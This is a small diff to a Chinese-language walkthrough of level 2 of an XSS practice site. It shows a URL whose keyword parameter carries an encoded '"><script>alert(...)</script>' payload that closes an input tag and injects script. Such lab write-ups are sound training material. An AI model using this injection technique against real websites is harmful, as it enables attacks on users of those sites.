@@ -11,4 +11,5 @@ ok,顺利通关
 url为:
 https://xss.fbisb.com/yx/level2.php?keyword=test 
 keyword会回显到页面input的value属性，url改为
-https://xss.fbisb.com/yx/level2.php?keyword=%22%3E%3Cscript%3Ealert(%22level2%22)%3C/script%3E,闭合原有input标签，插入script脚本后通关
+https://xss.fbisb.com/yx/level2.php?keyword=%22%3E%3Cscript%3Ealert(%22level2%22)%3C/script%3E
+闭合原有input标签，插入script脚本后通关
